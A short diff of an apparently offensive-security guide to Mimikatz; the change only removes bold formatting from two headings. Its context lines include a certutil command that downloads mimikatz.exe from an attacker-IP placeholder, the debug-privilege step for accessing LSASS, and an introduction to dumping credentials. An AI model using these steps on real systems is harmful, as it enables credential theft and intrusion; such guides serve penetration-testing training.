@@ -25,7 +25,7 @@ certutil -urlcache -f http://<attacker-ip>:<port>/mimikatz.exe mimikatz.exe
 mimikatz.exe
 ```
 
-## **Enable Debug Privileges**
+## Enable Debug Privileges
 
 For Mimikatz to interact with Windows security processes like LSASS (Local Security Authority Subsystem Service), you must grant it the necessary privileges. This is done by enabling the `debug` privilege within Mimikatz:
 
@@ -34,7 +34,7 @@ privilege::debug
 ```
 
 
-## **Dumping Credentials**
+## Dumping Credentials
 
 Mimikatz can dump various credentials, such as passwords, hashes, and Kerberos tickets, from memory. Below are the most common commands to extract these credentials:
 
